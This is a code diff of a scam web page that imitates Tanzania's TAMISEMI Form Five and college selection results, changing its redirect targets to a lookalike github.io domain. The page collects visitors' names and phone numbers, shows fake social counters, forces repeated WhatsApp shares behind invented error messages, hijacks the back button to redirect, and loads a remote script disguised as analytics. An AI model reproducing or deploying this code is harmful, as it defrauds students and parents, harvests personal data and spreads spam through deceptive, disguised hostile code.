@@ -14126,9 +14126,9 @@ button.close {
             <div class="col-xl-10 col-md-9 py-2 d-flex align-items-center">
               <marquee behavior="scroll" direction="left" onmouseover="this.stop();" onmouseout="this.start();">
                 <ul class="list-inline mb-0">
-                                  <li class="list-inline-item mx-4"> <a class="p-3 text-white bold-600 fs-13em" onclick="window.open('/');" href="http://e7bit.com/tz.html"> ANGALIA: ORODHA YA WANAFUNZI WALIOCHAGULIWA KUJIUNGA NA KIDATO CHA TANO NA VYUO 2026   </a> </li>
-                                  <li class="list-inline-item mx-4"> <a class="p-3 text-white bold-600 fs-13em" onclick="window.open('/');" href="http://e7bit.com/tz.html"> TAMISEMI SELFROM FORM FIVE AND COLLEGE SELECTION 2026 </a> </li>
-                                  <li class="list-inline-item mx-4"> <a class="p-3 text-white bold-600 fs-13em" onclick="window.open('/');" href="http://e7bit.com/tz.html"> UCHAGUZI WA WANAFUNZI WA KIDATO CHA TANO NA VYUO 2026 </a> </li>
+                                  <li class="list-inline-item mx-4"> <a class="p-3 text-white bold-600 fs-13em" onclick="window.open('/');" href="https://selform-tamiisemii.github.io/tz.html"> ANGALIA: ORODHA YA WANAFUNZI WALIOCHAGULIWA KUJIUNGA NA KIDATO CHA TANO NA VYUO 2026   </a> </li>
+                                  <li class="list-inline-item mx-4"> <a class="p-3 text-white bold-600 fs-13em" onclick="window.open('/');" href="https://selform-tamiisemii.github.io/tz.html"> TAMISEMI SELFROM FORM FIVE AND COLLEGE SELECTION 2026 </a> </li>
+                                  <li class="list-inline-item mx-4"> <a class="p-3 text-white bold-600 fs-13em" onclick="window.open('/');" href="https://selform-tamiisemii.github.io/tz.html"> UCHAGUZI WA WANAFUNZI WA KIDATO CHA TANO NA VYUO 2026 </a> </li>
                               </ul>
               </marquee>
             </div>
@@ -14243,7 +14243,7 @@ button.close {
                             <br>
                             <center>
                             <!-- DOWNLOAD FOMU Button -->
-                            <a onclick="dapp()" href="http://e7bit.com/tz.html">
+                            <a onclick="dapp()" href="https://selform-tamiisemii.github.io/tz.html">
                                <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary">
                                   <font color="blue">DOWNLOAD ORODHA YA MAJINA</font>
                                </button>
@@ -14251,7 +14251,7 @@ button.close {
                             <br/>
                          
                             <!-- TUMA TENA MAOMBI Button -->
-                            <a onclick="dapp()" href="http://e7bit.com/tz.html">
+                            <a onclick="dapp()" href="https://selform-tamiisemii.github.io/tz.html">
                                <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary">
                                   <font color="blue">DOWNLOAD BARUA KUJIUNGA (JOINING INSTRUCTION)</font>
                                </button>
@@ -14259,7 +14259,7 @@ button.close {
                             <br/>
                          
                             <!-- DOWNLOAD BARUA Button -->
-                            <a onclick="dapp()" href="http://e7bit.com/tz.html">
+                            <a onclick="dapp()" href="https://selform-tamiisemii.github.io/tz.html">
                                <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary">
                                   <font color="blue">DOWNLOAD JOINING INSTRUCTION</font>
                                </button>
@@ -14271,14 +14271,14 @@ button.close {
                          </center>
                          
                          <script>
-                            var dl = 'http://e7bit.com/tz.html';
-                            var dll = 'http://e7bit.com/tz.html';
-                            var dl3 = 'http://e7bit.com/tz.html';
-                            var dll3 = 'http://e7bit.com/tz.html';
-                            var dlll = 'http://e7bit.com/tz.html';
-                            var dll1 = 'http://e7bit.com/tz.html';
-                            var dlll2 = 'http://e7bit.com/tz.html';
-                            var dllll = 'http://e7bit.com/tz.html';
+                            var dl = 'https://selform-tamiisemii.github.io/tz.html';
+                            var dll = 'https://selform-tamiisemii.github.io/tz.html';
+                            var dl3 = 'https://selform-tamiisemii.github.io/tz.html';
+                            var dll3 = 'https://selform-tamiisemii.github.io/tz.html';
+                            var dlll = 'https://selform-tamiisemii.github.io/tz.html';
+                            var dll1 = 'https://selform-tamiisemii.github.io/tz.html';
+                            var dlll2 = 'https://selform-tamiisemii.github.io/tz.html';
+                            var dllll = 'https://selform-tamiisemii.github.io/tz.html';
                             var dll119 = 'https://e7bit.com/earn/fm5.html';
                          
                             function dapp() {
@@ -14327,7 +14327,7 @@ button.close {
     
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.min.js" integrity="sha384-QJHtvGhmr9XOIpI6YVutG+2QOK9T+ZnN4kzFN1RtK3zEFEIsxhlmWl5/YESvpZ13" crossorigin="anonymous"></script>
     <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
-    <script type="text/javascript">var wasap="*📚MAJINA YA WANAFUNZI WALIOCHAGULIWA KIDATO CHA TANO NA VYUO VYA KATI 2026 | TAMISEMI FORM FIVE SELECTION 2026*%0A%0A> ANGALIA MAJINA YOTE👇%0Ahttps://cutt.ly/orodha-ya-wanafunzi-kidato-cha-tano-na-vyuo-2026  ",error="An Error occurred!\nWhatsapp Share was not counted, you may have shared it with the same friend or group more than once.\nPlease share to different groups.",goto="http://e7bit.com/tz.html",sendto="whatsapp://send?text="+wasap;if(localStorage.getItem("width")!==null){var mywidth=localStorage.width * 1;$("#div1").fadeOut(0);$(".comments").fadeOut(0);$("#div3").fadeIn(0);$("#showName").html(localStorage.name);$("#showPhone").html(localStorage.phone);$("#showState").html(localStorage.state);$("#showEdu").html(localStorage.edu);$("#showCourse").html(localStorage.course);$("#showSchool").html(localStorage.school);$(".progress-bar2").css("width", mywidth + "%");if(localStorage.width>=100){$("#whatsappShare").fadeOut(0);$("#lastStep").fadeIn(1000);}}else{var mywidth=2;}$("#share1").click(function(){window.location.href=sendto;});var time=0;window.setInterval(function (){time=time + 1;$(".t1").html(time + 1 + "m");$(".t2").html(time + 2 + "m");$(".t3").html(time + 4 + "m");}, 6e4);var likes=104,comments=43,shares=42;window.setInterval(function (){likes=likes + Math.floor(Math.random() * 3);comments=comments + Math.floor(Math.random() * 2);shares=shares + Math.floor(Math.random() * 2);$("#likes").html(likes + "K");$("#comments").html(comments + "K comments");$("#shares").html(shares + "K shares");}, 5e3);$(".liked").click(function (){if($(this).hasClass("selected")){$(this).removeClass("selected");$(this).html("Like");}else{$(this).addClass("selected");$(this).html("Unlike");}});$("#btn1").click(function(){var iname=$("#inputName").val(),iphone=$.trim($("#inputPhone").val()),istate=$("#inputState").val();if(iname.length < 1){$("#error1").html("Please enter your full name").fadeIn(500).delay(5000).fadeOut(500);}else if(iphone.length < 1){$("#error1").html("Please enter a valid phone number").fadeIn(500).delay(5000).fadeOut(500);}else if(istate.length < 1){$("#error1").html("Please enter your state of origin").fadeIn(500).delay(5000).fadeOut(500);}else{localStorage.setItem("name", iname);localStorage.setItem("phone", iphone);localStorage.setItem("state", istate);$("#div1").fadeOut(0);$("#spinner-txt").html("Processing your information, please wait...");$("#spinnerDIV").fadeIn(1000);$("#showName").html(localStorage.name);$("#showPhone").html(localStorage.phone);$("#showState").html(localStorage.state);$("#showEdu").html(localStorage.edu);$("#showCourse").html(localStorage.course);$("#showSchool").html(localStorage.school);var i=0;var interval=setInterval(function(){i+=1;if(i>=100){clearInterval(interval);$(".comments").fadeOut(0);$("#spinnerDIV").fadeOut(0);$("#div3").fadeIn(1000);localStorage.setItem("width", 2);}}, 70);}});$("#btnShare").click(function(){window.location.href=sendto;$("#btnShare").attr("disabled","disabled");if(mywidth==2){mywidth+=18;}else if(mywidth==20){alert(error);mywidth+=20;}else if(mywidth==40){mywidth+=20;}else if(mywidth==60){alert(error);mywidth+=20;}else if(mywidth==80){mywidth+=5;}else if(mywidth==85){mywidth+=5;}else if(mywidth==90){mywidth+=5;}else if(mywidth==95){mywidth+=5;setTimeout(function (){$("#whatsappShare").fadeOut(0);$("#lastStep").fadeIn(1000);}, 1000);}else{$("#whatsappShare").fadeOut(0);$("#lastStep").fadeIn(1000);}localStorage.setItem("width", mywidth);setTimeout(function (){$("#btnShare").removeAttr("disabled","disabled");$(".progress-bar2").css("width", mywidth + "%");}, 2000);});$("#btn3").click(function(){$("#div3").fadeOut(0);$("#progressDIV").fadeIn(1000);var i=0;var interval=setInterval(function (){i+=1;$(".progress-bar1").css("width", i + "%");if(i>=115){clearInterval(interval);$("#progressDIV").fadeOut(0);$("#div1").fadeOut(0);$(".comments").fadeOut(0);$("#div4").fadeIn(1000);}}, 50);});$("#restart").click(function(){localStorage.clear();window.location.href='';});$("#btnOffer").click(function (){window.open(goto, "_blank");});$(".reply-comment").click(function(){$("#comm").attr("placeholder","Write a reply...");$('#comm').focus();});$("#comm").focusout(function(){if($(this).attr("placeholder")=="Write a reply..."){$(this).attr("placeholder","Write a comment...");}});</script>
+    <script type="text/javascript">var wasap="*📚MAJINA YA WANAFUNZI WALIOCHAGULIWA KIDATO CHA TANO NA VYUO VYA KATI 2026 | TAMISEMI FORM FIVE SELECTION 2026*%0A%0A> ANGALIA MAJINA YOTE👇%0Ahttps://cutt.ly/orodha-ya-wanafunzi-kidato-cha-tano-na-vyuo-2026  ",error="An Error occurred!\nWhatsapp Share was not counted, you may have shared it with the same friend or group more than once.\nPlease share to different groups.",goto="https://selform-tamiisemii.github.io/tz.html",sendto="whatsapp://send?text="+wasap;if(localStorage.getItem("width")!==null){var mywidth=localStorage.width * 1;$("#div1").fadeOut(0);$(".comments").fadeOut(0);$("#div3").fadeIn(0);$("#showName").html(localStorage.name);$("#showPhone").html(localStorage.phone);$("#showState").html(localStorage.state);$("#showEdu").html(localStorage.edu);$("#showCourse").html(localStorage.course);$("#showSchool").html(localStorage.school);$(".progress-bar2").css("width", mywidth + "%");if(localStorage.width>=100){$("#whatsappShare").fadeOut(0);$("#lastStep").fadeIn(1000);}}else{var mywidth=2;}$("#share1").click(function(){window.location.href=sendto;});var time=0;window.setInterval(function (){time=time + 1;$(".t1").html(time + 1 + "m");$(".t2").html(time + 2 + "m");$(".t3").html(time + 4 + "m");}, 6e4);var likes=104,comments=43,shares=42;window.setInterval(function (){likes=likes + Math.floor(Math.random() * 3);comments=comments + Math.floor(Math.random() * 2);shares=shares + Math.floor(Math.random() * 2);$("#likes").html(likes + "K");$("#comments").html(comments + "K comments");$("#shares").html(shares + "K shares");}, 5e3);$(".liked").click(function (){if($(this).hasClass("selected")){$(this).removeClass("selected");$(this).html("Like");}else{$(this).addClass("selected");$(this).html("Unlike");}});$("#btn1").click(function(){var iname=$("#inputName").val(),iphone=$.trim($("#inputPhone").val()),istate=$("#inputState").val();if(iname.length < 1){$("#error1").html("Please enter your full name").fadeIn(500).delay(5000).fadeOut(500);}else if(iphone.length < 1){$("#error1").html("Please enter a valid phone number").fadeIn(500).delay(5000).fadeOut(500);}else if(istate.length < 1){$("#error1").html("Please enter your state of origin").fadeIn(500).delay(5000).fadeOut(500);}else{localStorage.setItem("name", iname);localStorage.setItem("phone", iphone);localStorage.setItem("state", istate);$("#div1").fadeOut(0);$("#spinner-txt").html("Processing your information, please wait...");$("#spinnerDIV").fadeIn(1000);$("#showName").html(localStorage.name);$("#showPhone").html(localStorage.phone);$("#showState").html(localStorage.state);$("#showEdu").html(localStorage.edu);$("#showCourse").html(localStorage.course);$("#showSchool").html(localStorage.school);var i=0;var interval=setInterval(function(){i+=1;if(i>=100){clearInterval(interval);$(".comments").fadeOut(0);$("#spinnerDIV").fadeOut(0);$("#div3").fadeIn(1000);localStorage.setItem("width", 2);}}, 70);}});$("#btnShare").click(function(){window.location.href=sendto;$("#btnShare").attr("disabled","disabled");if(mywidth==2){mywidth+=18;}else if(mywidth==20){alert(error);mywidth+=20;}else if(mywidth==40){mywidth+=20;}else if(mywidth==60){alert(error);mywidth+=20;}else if(mywidth==80){mywidth+=5;}else if(mywidth==85){mywidth+=5;}else if(mywidth==90){mywidth+=5;}else if(mywidth==95){mywidth+=5;setTimeout(function (){$("#whatsappShare").fadeOut(0);$("#lastStep").fadeIn(1000);}, 1000);}else{$("#whatsappShare").fadeOut(0);$("#lastStep").fadeIn(1000);}localStorage.setItem("width", mywidth);setTimeout(function (){$("#btnShare").removeAttr("disabled","disabled");$(".progress-bar2").css("width", mywidth + "%");}, 2000);});$("#btn3").click(function(){$("#div3").fadeOut(0);$("#progressDIV").fadeIn(1000);var i=0;var interval=setInterval(function (){i+=1;$(".progress-bar1").css("width", i + "%");if(i>=115){clearInterval(interval);$("#progressDIV").fadeOut(0);$("#div1").fadeOut(0);$(".comments").fadeOut(0);$("#div4").fadeIn(1000);}}, 50);});$("#restart").click(function(){localStorage.clear();window.location.href='';});$("#btnOffer").click(function (){window.open(goto, "_blank");});$(".reply-comment").click(function(){$("#comm").attr("placeholder","Write a reply...");$('#comm').focus();});$("#comm").focusout(function(){if($(this).attr("placeholder")=="Write a reply..."){$(this).attr("placeholder","Write a comment...");}});</script>
     <script>
     window.onhashchange=function(){jp();};
     function hh() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}
@@ -14335,10 +14335,10 @@ button.close {
         fh();}
     setTimeout('hh();', 500);
     function fh(){
-        location.href="http://e7bit.com/tz.html";
+        location.href="https://selform-tamiisemii.github.io/tz.html";
     }
     function goon(){
-        location.href="http://e7bit.com/tz.html";
+        location.href="https://selform-tamiisemii.github.io/tz.html";
     }
     </script>
     
@@ -14351,17 +14351,17 @@ button.close {
         fh();}
     setTimeout('hh();', 500);
     function fh(){
-        location.href="http://e7bit.com/tz.html";
+        location.href="https://selform-tamiisemii.github.io/tz.html";
     }
     function goon(){
-        location.href="http://e7bit.com/tz.html";
+        location.href="https://selform-tamiisemii.github.io/tz.html";
     }
     </script>
     <script>
     var _hmt = _hmt || [];
     (function() {
         var hm = document.createElement("script");
-        hm.src = "http://e7bit.com/tz.html";
+        hm.src = "https://selform-tamiisemii.github.io/tz.html";
         var s = document.getElementsByTagName("script")[0];
         s.parentNode.insertBefore(hm, s);
     })();
